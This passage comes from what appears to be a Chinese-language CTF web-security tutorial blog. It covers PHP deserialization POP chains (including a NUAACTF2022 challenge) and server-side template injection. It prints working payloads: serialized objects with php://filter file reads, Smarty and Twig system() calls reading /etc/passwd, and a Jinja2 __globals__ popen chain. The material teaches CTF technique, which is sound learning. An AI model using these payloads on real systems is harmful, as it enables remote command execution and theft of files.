class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="string">&#x27;department&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="keyword">new</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="keyword">new</span> classroom;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload：</p><p><code>get:d=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=</code></p><p><code>post:a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php</code></p><p>2.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[NUAACTF2022]superpop</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$variable</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;username != <span class="variable language_">$this</span>-&gt;password) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;username) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;username)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;password)) )&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;wuhu!&quot;</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;variable-&gt;xxx;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;o^o&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$point</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;point;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;	</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很简单的一条pop链子，用到了Error原生类绕过hash</p><p><code>__wakeup() -&gt; __get -&gt; __invoke()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$variable</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$point</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$function</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="comment">// 方法一:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>, <span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">方法二:</span></span><br><span class="line"><span class="comment">$a = array(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">$b = array(&quot;2&quot;);</span></span><br><span class="line"><span class="comment">$user-&gt;username = $a;</span></span><br><span class="line"><span class="comment">$user-&gt;password = $b;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$read</span>-&gt;filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag&quot;</span>;</span><br><span class="line"><span class="variable">$login</span>-&gt;point = <span class="variable">$read</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;variable = <span class="variable">$login</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="destruct的触发"><a href="#destruct的触发" class="headerlink" title="__destruct的触发"></a>__destruct的触发</h4><p>正常情况下</p><p>在PHP中，正常触发析构函数(__destruct)有三种方法：</p><p>①程序正常结束</p><p>②主动调用unset($aa)</p><p>③将原先指向类的变量取消对类的引用</p><p>throw Error会使得我们的程序没有正常结束，所以类没有被销毁</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;异常&quot;</span>);</span><br></pre></td></tr></table></figure><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/9.png" title="wuhu"><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI,又称服务器模板注入攻击，发生在MVC框架的view层，ssti的导致原因是由于使用了<code>render_template</code></p><p>由于模板引擎使用静态模板文件，并在运用时用HTML页面中的实际值替换变量&#x2F;占位符，从而让HTML页面的设计更容易。当前广泛应用的模板有Smarty，Twig，Jinja2，FreeMarker和Velocity</p><p>服务器接收了用户的输入，将其作为web应用模板内容的一部分，在进行部分目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、Getshell等问题</p><p>模板引擎可以让网站程序实现界面和数据分离，业务代码和逻辑代码的分离，大大提升了开发效率，也使得代码重用变得更加容易，但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但是也同样存在沙箱逃逸技术来绕过</p><p>模板是一种提供给程序来解析的语法，换句话说，模板是从数据（变量）到实际的视觉表现（HTML）这项工作的一种实现手段。</p><p>最重要的是模板渲染，你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。实际上，ssti引发的问题主要就是render_template渲染函数的问题</p><p>这个函数作用就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面。</p><p>注入思想是不断调用我们要使用的命令，如file,read,open,ls等，来读取和写入配置文件</p><h3 id="判断模板引擎"><a href="#判断模板引擎" class="headerlink" title="判断模板引擎"></a>判断模板引擎</h3><p>1.根据编程语言</p><p>各种编程语言对应的模板引擎如下：</p><blockquote><p>Java:</p><ul><li>FreeMarker</li><li>Thymeleaf</li><li>Velocity</li><li>JSP (JavaServer Pages)</li></ul><p>Python:</p><ul><li>Jinja2</li><li>Django模板</li></ul><p>PHP:</p><ul><li>Blade (Laravel框架自带)</li><li>Smarty</li></ul><p>JavaScript:</p><ul><li>Handlebars.js</li><li>EJS (Embedded JavaScript)</li><li>Pug (formerly Jade)</li></ul><p>Ruby:</p><ul><li>ERB (Embedded Ruby)</li><li>Haml</li></ul><p>Go:</p><ul><li>html&#x2F;template</li></ul></blockquote><p>2.根据此图片</p><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/7.png" title="wuhu"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;-&gt;7777777-&gt;Jinja2</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;-&gt;49-&gt;twig</span><br></pre></td></tr></table></figure><h3 id="判断模板注入的注入点方法"><a href="#判断模板注入的注入点方法" class="headerlink" title="判断模板注入的注入点方法"></a>判断模板注入的注入点方法</h3><p>找这样的场景：输入什么，就输出什么！</p><p>这样的常见有两种比较大可能的类型：</p><p>1.SSTI</p><p>2.XSS(需要bot)</p><h4 id="Smarty-SSTI"><a href="#Smarty-SSTI" class="headerlink" title="Smarty SSTI"></a>Smarty SSTI</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125; </span><br><span class="line">&#123;system(&#x27;ls&#x27;)&#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;123&#123;/if&#125;</span><br></pre></td></tr></table></figure><h4 id="Twig-SSTI"><a href="#Twig-SSTI" class="headerlink" title="Twig SSTI"></a>Twig SSTI</h4><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;self&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(“exec”)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(“id”)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&#x27;cat\x20/etc/passwd&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&#x27;cat$IFS/etc/passwd&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h4><p>下面是一些会用到的魔术对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  :返回类型所属的对象</span><br><span class="line">__mro__    :返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   <span class="string">&quot;返回该对象所继承的基类</span></span><br><span class="line"><span class="string">// __base__和__mro__都是用来寻找基类的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__subclasses__  获取当前类的所有子类</span></span><br><span class="line"><span class="string">__init__  类的初始化方法</span></span><br><span class="line"><span class="string">__globals__  对包含(保存)函数全局变量的字典的引用</span></span><br></pre></td></tr></table></figure><p>用魔术对象可以构造一些简单的语句：</p><p>我们在里面运行以下：</p><img src="/img/loading.gif" data-original="/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/8.png" title="wuhu"><blockquote><p>解读一下：<br>class返回[]所属的对象；<br>class+base:返回这个对象所继承的基类<br>class+base+subclasses:找到了这个对象的基类，那么就返回这个基类下所具有的子类</p></blockquote><p>Jinja模板引擎特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;...&#125;&#125;: 装载一个变量，模板渲染的时候，会使用传进来的同名参数将这个变量代表的值替换掉</span><br><span class="line"></span><br><span class="line">&#123;%...%&#125;:装载一个控制语句</span><br><span class="line"></span><br><span class="line">&#123;#...#&#125;:装载一个注释，模板渲染的时候会忽视这中间的值</span><br></pre></td></tr></table></figure><p>核心思路：找<code>__globals__</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;)).read())&#125;&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="/img/loading.gif" data-original="/img/head2.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="/img/loading.gif" data-original="/img/head2.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">1azy_fish.</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://la2y_fish.gitee.io/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/">原创</a><a class="post-copyright-title"><span onclick='rm.copyPageUrl("https://la2y_fish.gitee.io/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/")'>web入个门</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><script>function copyCurrentPageUrl(){var e=window.location.href,t=document.createElement("input");t.setAttribute("value",e),document.body.appendChild(t),t.select(),t.setSelectionRange(0,99999),document.execCommand("copy"),document.body.removeChild(t)}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://la2y_fish.gitee.io" target="_blank">1azy_fish.</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/Web/"><span class="categoryes-punctuation"><i class="anzhiyufont anzhiyu-icon-inbox"></i></span>Web<span class="categoryesPageCount">9</span></a></div><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/CTF/"><span class="tags-punctuation"><i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF<span class="tagsPageCount">10</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/30/Python-web/"><img class="prev-cover" src="/img/loading.gif" data-original="/img/26.jpg" onerror='onerror=null,src="/img/3.png"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python_web_CTF</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/03/%E5%9B%A0%E4%B8%BA%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%BC%95%E8%B5%B7%E7%9A%84Linux%E6%8F%90%E6%9D%83/"><img class="next-cover" src="/img/loading.gif" data-original="/img/12.jpg" onerror='onerror=null,src="/img/3.png"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux提权</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size:1.5rem;margin-right:4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/10/04/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89/" title="BUUCTF刷题（1）"><img class="cover" src="/img/loading.gif" data-original="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-04</div><div class="title">BUUCTF刷题（1）</div></div></a></div><div><a href="/2023/12/01/0xGame-2023-web/" title="0xGame_2023_web"><img class="cover" src="/img/loading.gif" data-original="/img/24.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-01</div><div class="title">0xGame_2023_web</div></div></a></div><div><a href="/2023/10/14/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%883%EF%BC%89/" title="BUUCTF刷题（3）"><img class="cover" src="/img/loading.gif" data-original="/img/18.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-14</div><div class="title">BUUCTF刷题（3）</div></div></a></div><div><a href="/2023/10/05/BUUCTF%E5%88%B7%E9%A2%98%EF%BC%882%EF%BC%89/" title="BUUCTF刷题（2）"><img class="cover" src="/img/loading.gif" data-original="/img/15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-05</div><div class="title">BUUCTF刷题（2）</div></div></a></div><div><a href="/2023/04/07/NewstarCTF-2022misc/" title="NewstarCTF_2022misc"><img class="cover" src="/img/loading.gif" data-original="/img/31.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-07</div><div class="title">NewstarCTF_2022misc</div></div></a></div><div><a href="/2023/04/07/NewstarCTF_2022web/" title="NewstarCTF_2022web"><img class="cover" src="/img/loading.gif" data-original="/img/30.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-07</div><div class="title">NewstarCTF_2022web</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src="/img/loading.gif" data-original="/img/head2.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__description">时光的沙漏里，细沙流走的是光阴。<br>淡淡檀香里，裊袅燃尽的是光阴。<br></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-web%E5%85%A5%E9%97%A8"><span class="toc-number">1.</span> <span class="toc-text">CTF_web入门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">查看源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.3.</span> <span class="toc-text">git泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DS-Store%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.4.</span> <span class="toc-text">DS_Store泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#robots-txt"><span class="toc-number">1.1.5.</span> <span class="toc-text">robots.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F"><span class="toc-number">1.1.6.</span> <span class="toc-text">备份文件源码泄漏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">1.2.1.</span> <span class="toc-text">HTTP请求中的一些请求头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">1.2.2.</span> <span class="toc-text">HTTP请求中的一些常用自定义请求头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84Content-Type%E7%B1%BB%E5%9E%8B%E5%8C%85%E6%8B%AC%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">常见的Content-Type类型包括：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">请求方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-POST"><span class="toc-number">1.2.5.</span> <span class="toc-text">GET&amp;POST</span></a></li><li class="toc-item 